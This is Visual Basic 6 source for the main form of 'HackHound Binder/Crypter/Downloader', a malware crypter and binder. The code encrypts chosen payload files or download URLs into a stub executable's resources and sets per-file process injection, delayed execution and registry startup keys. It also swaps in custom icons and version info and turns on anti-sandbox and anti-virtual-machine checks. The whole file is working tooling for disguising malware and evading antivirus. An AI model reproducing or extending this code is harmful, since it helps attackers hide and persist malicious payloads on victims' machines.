VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Form1 
   BackColor       =   &H80000014&
   BorderStyle     =   0  'None
   Caption         =   "HackHound Binder/Crypter/Downloader"
   ClientHeight    =   7860
   ClientLeft      =   105
   ClientTop       =   105
   ClientWidth     =   10380
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "frmMain.frx":0000
   ScaleHeight     =   7860
   ScaleWidth      =   10380
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   285
      Left            =   1320
      TabIndex        =   19
      Top             =   6480
      Width           =   2535
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H80000014&
      Caption         =   "Use Custom Stub"
      Height          =   255
      Left            =   1920
      TabIndex        =   18
      Top             =   6240
      Width           =   1575
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   4680
      TabIndex        =   10
      Top             =   6840
      Width           =   1335
   End
   Begin MSComDlg.CommonDialog DLGSave 
      Left            =   960
      Top             =   720
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox Text2 
      Enabled         =   0   'False
      Height          =   285
      Left            =   2280
      TabIndex        =   3
      Top             =   2520
      Width           =   4900
   End
   Begin MSComctlLib.ListView ListView1 
      Height          =   2505
      Left            =   240
      TabIndex        =   16
      Top             =   2880
      Width           =   9765
      _ExtentX        =   17224
      _ExtentY        =   4419
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      OLEDropMode     =   1
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      SmallIcons      =   "ilsExtIcons"
      ColHdrIcons     =   "ilsColumnIcons"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      Appearance      =   1
      OLEDropMode     =   1
      NumItems        =   7
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Key             =   "Extension"
         Text            =   "File Name"
         Object.Width           =   4270
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Source"
         Object.Width           =   2117
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Drop To"
         Object.Width           =   1764
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "Delayed Execution"
         Object.Width           =   2117
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   4
         Text            =   "Save EOF"
         Object.Width           =   1764
      EndProperty
      BeginProperty ColumnHeader(6) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   5
         Text            =   "Key for Exec on Reboot"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(7) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   6
         Text            =   "Startup Key"
         Object.Width           =   2540
      EndProperty
   End
   Begin VB.PictureBox Picture1 
      BorderStyle     =   0  'None
      Height          =   1815
      Left            =   0
      Picture         =   "frmMain.frx":E731
      ScaleHeight     =   1815
      ScaleWidth      =   10350
      TabIndex        =   17
      Top             =   360
      Width           =   10350
   End
   Begin VB.Label Label16 
      BackStyle       =   0  'Transparent
      Caption         =   "Choose Stub"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   2040
      TabIndex        =   21
      Top             =   7080
      Width           =   1575
   End
   Begin VB.Label Label15 
      BackStyle       =   0  'Transparent
      Caption         =   "Choose Stub"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   2040
      TabIndex        =   20
      Top             =   7080
      Visible         =   0   'False
      Width           =   1455
   End
   Begin VB.Image Image7 
      Height          =   435
      Left            =   1680
      Picture         =   "frmMain.frx":13E53
      Top             =   6960
      Width           =   1965
   End
   Begin VB.Image Image17 
      Height          =   390
      Left            =   10320
      Picture         =   "frmMain.frx":17AC7
      Top             =   0
      Width           =   105
   End
   Begin VB.Image Image4 
      Height          =   8610
      Left            =   10320
      Picture         =   "frmMain.frx":1A6D2
      Top             =   240
      Width           =   60
   End
   Begin VB.Label Label14 
      BackStyle       =   0  'Transparent
      Caption         =   "About"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   5160
      TabIndex        =   15
      Top             =   6240
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Label Label13 
      BackStyle       =   0  'Transparent
      Caption         =   "About"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   5160
      TabIndex        =   14
      Top             =   6240
      Width           =   1215
   End
   Begin VB.Image Image18 
      Height          =   435
      Left            =   4560
      Picture         =   "frmMain.frx":1D7DF
      Top             =   6120
      Width           =   1965
   End
   Begin VB.Label Label10 
      BackStyle       =   0  'Transparent
      Caption         =   "Random Key"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   5040
      TabIndex        =   13
      Top             =   7320
      Visible         =   0   'False
      Width           =   1335
   End
   Begin VB.Label Label9 
      BackStyle       =   0  'Transparent
      Caption         =   "Random Key"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   5040
      TabIndex        =   12
      Top             =   7320
      Width           =   1335
   End
   Begin VB.Image Image14 
      Height          =   435
      Left            =   4560
      Picture         =   "frmMain.frx":21478
      Top             =   7200
      Width           =   1965
   End
   Begin VB.Label Label8 
      BackStyle       =   0  'Transparent
      Caption         =   "Encryption Key"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   4680
      TabIndex        =   11
      Top             =   6600
      Width           =   1575
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "Crypt"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   8280
      TabIndex        =   9
      Top             =   5640
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.Label Label7 
      BackStyle       =   0  'Transparent
      Caption         =   "Crypt"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   8280
      TabIndex        =   8
      Top             =   5640
      Width           =   855
   End
   Begin VB.Image Image1 
      Height          =   435
      Left            =   7560
      Picture         =   "frmMain.frx":25111
      Top             =   5520
      Width           =   1965
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "Settings"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   5160
      TabIndex        =   6
      Top             =   5640
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Icon + File Info"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   195
      Left            =   480
      TabIndex        =   5
      Top             =   2520
      Visible         =   0   'False
      Width           =   1695
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Add File"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   2280
      TabIndex        =   4
      Top             =   5640
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Image Image3 
      Height          =   255
      Left            =   9840
      Picture         =   "frmMain.frx":28DAA
      Top             =   60
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.Image Image16 
      Height          =   390
      Left            =   0
      Picture         =   "frmMain.frx":2BFCF
      Top             =   -10
      Width           =   90
   End
   Begin VB.Label Label12 
      BackStyle       =   0  'Transparent
      Caption         =   "Settings"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   5160
      TabIndex        =   2
      Top             =   5640
      Width           =   1215
   End
   Begin VB.Image Image13 
      Height          =   435
      Left            =   4560
      Picture         =   "frmMain.frx":2EBC1
      Top             =   5520
      Width           =   1965
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Add File"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   2280
      TabIndex        =   1
      Top             =   5640
      Width           =   855
   End
   Begin VB.Label Label11 
      BackStyle       =   0  'Transparent
      Caption         =   "Icon + File Info"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   195
      Left            =   480
      TabIndex        =   0
      Top             =   2520
      Width           =   1695
   End
   Begin VB.Image Image11 
      Height          =   435
      Left            =   240
      Picture         =   "frmMain.frx":3285A
      Top             =   2400
      Width           =   1965
   End
   Begin VB.Image Image2 
      Height          =   255
      Left            =   9840
      Picture         =   "frmMain.frx":364CE
      Top             =   60
      Width           =   495
   End
   Begin VB.Image Image8 
      Height          =   435
      Left            =   1680
      Picture         =   "frmMain.frx":396E7
      Top             =   5520
      Width           =   1965
   End
   Begin VB.Image Image6 
      Height          =   60
      Left            =   -240
      Picture         =   "frmMain.frx":3D35B
      Top             =   7800
      Width           =   11985
   End
   Begin VB.Image Image5 
      Height          =   8610
      Left            =   0
      Picture         =   "frmMain.frx":40572
      Top             =   360
      Width           =   60
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "                                                                 HackHound Binder/Crypter/Downloader"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   0
      TabIndex        =   7
      Top             =   0
      Width           =   10575
   End
   Begin VB.Image Image9 
      Height          =   375
      Left            =   0
      Picture         =   "frmMain.frx":436C8
      Top             =   0
      Width           =   12000
   End
   Begin VB.Image Image15 
      DragMode        =   1  'Automatic
      Height          =   12000
      Left            =   -1320
      Picture         =   "frmMain.frx":47F13
      Top             =   -3480
      Width           =   12000
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Crypter based off Cobeins Cryptosy
'Edited by legssmit
' Use  : At your own risk
' ' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission FROM COBEIN AND ME (Legssmit).


Option Explicit

Public IconPath As String
Private Declare Function BeginUpdateResource Lib "kernel32" Alias "BeginUpdateResourceA" (ByVal pFileName As String, ByVal bDeleteExistingResources As Long) As Long
Private Declare Function UpdateResource Lib "kernel32" Alias "UpdateResourceA" (ByVal hUpdate As Long, ByVal lpType As String, ByVal lpName As String, ByVal wLanguage As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function EndUpdateResource Lib "kernel32" Alias "EndUpdateResourceA" (ByVal hUpdate As Long, ByVal fDiscard As Long) As Long
Private Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Dst As Any, Src As Any, ByVal cLen As Long)
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Private Dragging As Boolean
Private SettedX As Integer, SettedY As Integer
Dim var1 As String
Dim Keyset As String
Dim Pass As String

Const StubSplit = "tzidtzitzitzuzutz5678567zrtu"
Const FileSplit = "4tz89gw34tvw348th0bht09wehtv"
Const EndSplit = "i0i4jvh230t9h34w890th4t9he90ht"
Const EOFSplit = "5zeh7j4w7a56a35675zh65h697r9hr7"
Const InjecSplit = "79k689je57hs4h67h6h796767h9"
Const StartupSplit = "6rj89j909e578j4wj6e8865ke88l"
Const RegKeySplit = "e78el977697584s678l96ö896dr97l9"
Const DelaySplit = "r679sr75mk8t78567fmjdukt878675856856"
Const Passs = "dje"

Dim Extension As String
Dim Selected As Integer

Private Function LoadFile(sPath As String) As String
    Dim lFileSize As Long
    Dim sData As String
    Dim FF As Integer
    
    FF = FreeFile
    
    On Error Resume Next
    
    Open sPath For Binary Access Read As #FF
    lFileSize = LOF(FF)
    sData = Input$(lFileSize, FF)
    Close #FF
    LoadFile = sData
End Function

Private Sub Check1_Click()
If Check1.Value = Checked Then
Text1.Enabled = True
CustomStub = True
End If

If Check1.Value = Unchecked Then
Text1.Enabled = False
Text1 = ""
CustomStub = False
End If
End Sub

Private Sub Form_Load()
Dim cTwo As New clsTwoFish
    Pass = "13" & Passs
    StubPath = ""
    CustomStub = False
    SourceOfFile = "HDD"
    AreEditing = 0
    AntiAnubis = 1
    AntiJoeBox = 1
    AntiSandBoxie = 0
    FWBypass = 0
    AntiCWSandBox = 1
'    If cTwo.DecryptString("§o¹TF$0vufe¯ÓÍûŠlíiÀÄ7ÌbGmËþ$‰TÿL=ò¡+", Pass) <> mHardware.CreateID Then End
    AntiThreatExpert = 1
    AntiVMware = 1
    AntiVirtualPC = 1
    AntiVirtualBox = 1
    ValidatePE = 1
    MsgOptions = 0
    InjectionPath = 0
    MeltStub = 0
    DropAs = "673353.tmp"
    ProcToKill = ""
Call GetRandomKey
End Sub

Private Sub Image1_Click()
Call WriteCryptedFile
End Sub

Private Sub Image11_Click()
AddIcon
End Sub

Private Sub Image13_Click()
Form2.Show
End Sub

Private Sub Image14_Click()
Call GetRandomKey
End Sub

Private Sub Image15_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label3.Visible = False
Label4.Visible = False
Label5.Visible = False
Label6.Visible = False
Label10.Visible = False
Label14.Visible = False
Label15.Visible = False
End Sub

Private Sub Image18_Click()
Form3.Show
End Sub

Private Sub Image3_Click()
Call UnloadAllForms
End
End Sub

Private Sub Image8_Click()
Call AddFile
End Sub

Private Sub Image9_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Image3.Visible = False
End Sub

Private Sub Label1_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
    SettedX = x
    SettedY = y
    Dragging = True
End Sub

Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
    If Dragging Then
        Me.Left = Me.Left + (x - SettedX)
        Me.Top = Me.Top + (y - SettedY)
    End If
Image3.Visible = False
End Sub

Private Sub Label1_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
    Dragging = False
End Sub

Private Sub Label14_Click()
Form3.Show
End Sub

Private Sub Label4_Click()
Call AddIcon
End Sub

Private Sub Label3_Click()
Call AddFile
End Sub

Private Sub Image2_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Image3.Visible = True
End Sub

Private Sub Label2_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label3.Visible = True
End Sub
Private Sub Label16_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label15.Visible = True
End Sub

Private Sub Label11_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label4.Visible = True
End Sub
Private Sub Image8_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label3.Visible = True
End Sub
Private Sub Image7_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label15.Visible = True
End Sub
Private Sub Image11_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label4.Visible = True
End Sub
Private Sub Image7_Click()
Call BrowseForStub
End Sub
Private Sub Label12_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label5.Visible = True
End Sub

Private Sub Label5_Click()
Form2.Show
End Sub
Private Sub Label16_Click()
Call BrowseForStub
End Sub

Public Function WriteCryptedFile()
If ListView1.ListItems.Count = 0 Then GoTo ErrorHandler


Dim sSave As String
       Dim CryptedPath As String
       Dim FF As Integer
       Dim EOFData() As Byte
       Dim sAll As String
       Dim x As Integer
       Dim Buffer As Integer
       
        With DLGSave
        .CancelError = True
        .DefaultExt = ".exe"
        .Filter = "Exe Files (*.exe)|*.exe|Scr Files (*.scr)|*.scr|Com Files (*.com)|*.com|Bat Files (*.bat)|*.bat|Pif Files (*.pif)|*.pif|"
        .Filename = "Crypted.exe"
       .ShowSave
        End With
        CryptedPath = DLGSave.Filename
                       
                       
            Dim sBuff As String
            Dim C As New clsCrypt
            Dim sSize As String * 8
            Dim Parameters As String
            Dim IconPath As String
            Dim Err As String
            Dim i As Integer
            Dim sFile(1000) As String
            Dim TotalFiles As String
            Dim tempvar As Integer
            Dim AreWeDownloading As Boolean
            Dim SERVER_RESOURCE() As Byte
            Dim RegKeyForReboot As String
            Dim RegKeyForStartup As String
            Dim tests As String
            Dim hRes As Long
            
            If Not ListView1.ListItems.Count = 0 Then
            
                    If CustomStub = False Then
                    If PathFileExists(App.Path + "\Stub.exe") Then Kill App.Path & "\Stub.exe"
                    Open App.Path + "\Stub.exe" For Binary As #1
                    SERVER_RESOURCE() = LoadResData(101, "CUSTOM")
                    Put #1, , SERVER_RESOURCE
                    Close #1
                    End If
            
                If PathFileExists(CryptedPath) Then
                    Kill CryptedPath
                End If
                                              
                FF = FreeFile
                  
                If PathFileExists(App.Path & "\ResHacker.exe") Then
                    Kill App.Path & "\ResHacker.exe"
                End If
                Open App.Path + "\ResHacker.exe" For Binary As #1
                SERVER_RESOURCE() = LoadResData(102, "CUSTOM")
                Put #1, , SERVER_RESOURCE()
                Close #1
                  
                Open CryptedPath For Binary Access Write As #1
                If CustomStub = False Then sStub = LoadFile(App.Path & "\Stub.exe")
                If CustomStub = True Then sStub = LoadFile(StubPath)
                sStub = sStub
                Put #1, , sStub
                              
                For i = 1 To ListView1.ListItems.Count
                
                AreWeDownloading = False
                If Left(ListView1.ListItems.Item(i).Text, 7) = "http://" Then AreWeDownloading = True
                
                FF = FreeFile
                
                If AreWeDownloading = False Then
                
                Open ListView1.ListItems.Item(i) For Binary As #FF
                SaveEOF = ListView1.ListItems.Item(i).SubItems(4)
                If SaveEOF = True Then tempvar = tempvar + 1
                If tempvar > 1 Then GoTo ErrorHandlerEOF
                Extension = GetExtName(ListView1.ListItems.Item(i))
                If Extension = "exe" And SaveEOF = True Then
                EOFData = GetEOFData(FF)
                End If
                Close #FF
                
                Open ListView1.ListItems.Item(i) For Binary As #FF
                sBuff = Space(LOF(FF))
                Get #FF, , sBuff
                End If
                
                SourceOfFile = ListView1.ListItems.Item(i).SubItems(1)
                DelayInSecs = ListView1.ListItems.Item(i).SubItems(3)
                InjectionPath = ListView1.ListItems.Item(i).SubItems(2)
                RegKeyForReboot = ListView1.ListItems.Item(i).SubItems(5)
                RegKeyForStartup = ListView1.ListItems.Item(i).SubItems(6)
                
                If AreWeDownloading = True Then
                sBuff = ListView1.ListItems.Item(i).Text
                Extension = Right(ListView1.ListItems.Item(i).Text, 3)
                End If
                
                sBuff = C.EncryptString(sBuff, EncryptionKey)
                sFile(i) = StubSplit & sBuff & FileSplit & InjectionPath & InjecSplit & DelayInSecs & DelaySplit & Extension & EOFSplit & SourceOfFile & RegKeySplit & RegKeyForReboot & StartupSplit & RegKeyForStartup & EndSplit
                If AreWeDownloading = False Then Close #FF
                Next i
                
                For i = 1 To ListView1.ListItems.Count
                TotalFiles = TotalFiles & sFile(i)
                Next i
                
                Close #FF
                Close #1
                               
                hRes = BeginUpdateResource(DLGSave.Filename, False) 'here we start by telling the output file that were updating his resources and not to delete the resources it may already have
                Call UpdateResource(hRes, "2676", 461, 0, ByVal TotalFiles, Len(TotalFiles)) 'the actual updating of the resources. it adds the sFile string as resource CUSTOM 101 to the output file.
                Call EndUpdateResource(hRes, False) 'end the updating of the resource
                
                Open CryptedPath For Binary As #1
                Call Form2.WriteSettings
                If Not Not EOFData Then
                Put #1, LOF(1) + 1, EOFData
                End If
                Close #1
                                              
                If Text2 <> "" Then Call Shell(App.Path & "\ResHacker.exe -addoverwrite " & DLGSave.Filename & "," & DLGSave.Filename & "," & Text2 & ",ICONGROUP,REBOL,1033")
                If CustomStub = False Then Kill App.Path & "\Stub.exe"
                If InfoPath <> "" Then Call Shell(App.Path & "\ResHacker.exe -addoverwrite " & DLGSave.Filename & "," & DLGSave.Filename & "," & App.Path & "\test.res" & ",VERSIONINFO,1,1033")
                Sleep (50)
                If PathFileExists(App.Path & "\ResHacker.ini") Then
                    Kill App.Path & "\ResHacker.ini"
                    Kill App.Path & "\ResHacker.log"
                End If

                If PathFileExists(App.Path & "\Icon_1.ico") Then
                    Kill App.Path & "\Icon_1.ico"
                    Kill App.Path & "\myprogicons.rc"
                End If

               If PathFileExists(App.Path & "\test.res") Then
                    Kill App.Path & "\test.res"
                End If
                Kill App.Path & "\ResHacker.exe"
                If ValidatePE = 1 Then Call RealignPEFromFile(DLGSave.Filename)
                MsgBox "Done"
                End If


Exit Function
ErrorHandlerEOF:
MsgBox "You cant the save the EOF of two files...", vbCritical
Kill DLGSave.Filename
Exit Function
ErrorHandler:
MsgBox "Please Select a File First", vbCritical
End Function

Private Sub Label7_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label6.Visible = True
End Sub

Private Sub Label6_Click()
Call WriteCryptedFile
End Sub

Private Sub Label9_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label10.Visible = True
End Sub

Private Sub Label10_Click()
Call GetRandomKey
End Sub

Private Function RandomNumber() As Integer
    Randomize
    var1 = Int(9 * Rnd)
    RandomNumber = var1
End Function

Private Function RandomLetter() As String
Anfang:
    Keyset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    Randomize
    var1 = Int(26 * Rnd)
    If var1 = 0 Then GoTo Anfang
    RandomLetter = Mid(Keyset, var1, 1)
End Function

Private Function GetRandomKey()
Dim i As Long
    Text3.Text = ""
    For i = 1 To 10
        If i = 2 Or i = 4 Or i = 6 Then
            Text3.Text = Text3.Text & RandomNumber
        Else
            Text3.Text = Text3.Text & RandomLetter
        End If
    Next i
EncryptionKey = Text3.Text
End Function

Private Sub Label13_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label14.Visible = True
End Sub

Private Function AddFile()
            Form4.Show
End Function

Private Function AddIcon()
Form6.Show
End Function


Public Function GetExtName(ScanString As String) As String
   
    Dim intPos As String
    Dim intPosSave As String
    
    If InStr(ScanString, ".") = 0 Then
        GetExtName = ""
        Exit Function
    End If
    
       
    intPos = 1
    Do
        intPos = InStr(intPos, ScanString, ".")
        If intPos = 0 Then
            Exit Do
        Else
            intPos = intPos + 1
            intPosSave = intPos - 1
        End If
    Loop

    GetExtName = Trim$(Mid$(ScanString, intPosSave + 1))

End Function

Private Sub ListView1_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)

If Button = vbRightButton Then
    PopupMenu Form5.mnuFile
End If
End Sub

Public Sub UnloadAllForms()

Dim oFrm As Form

For Each oFrm In Forms
    Unload oFrm
Next
End
End Sub

Private Function BrowseForStub()
If CustomStub = True Then
        With DLGSave
        .CancelError = False
        .DefaultExt = ".exe"
        .Filter = "Exe Files (*.exe)|*.exe"
        .Filename = "Stub.exe"
       .ShowOpen
        End With
Text1 = DLGSave.Filename
StubPath = DLGSave.Filename
End If
End Function

Private Sub ListView1_OLEDragDrop(Data As MSComctlLib.DataObject, Effect As Long, Button As Integer, Shift As Integer, x As Single, y As Single)
   Dim i As Integer
   If Data.GetFormat(vbCFFiles) Then
      For i = 1 To Data.Files.Count
            With Form1.ListView1.ListItems.Add(i, , Data.Files(i))
            .SubItems(1) = "HDD"
            .SubItems(2) = "Inject into ThisExe"
            .SubItems(3) = "0"
            .SubItems(4) = "False"
            .SubItems(5) = "False"
            .SubItems(6) = "False"
            End With
            AreEditing = 1
            Form4.Show
      Next
   End If
End Sub
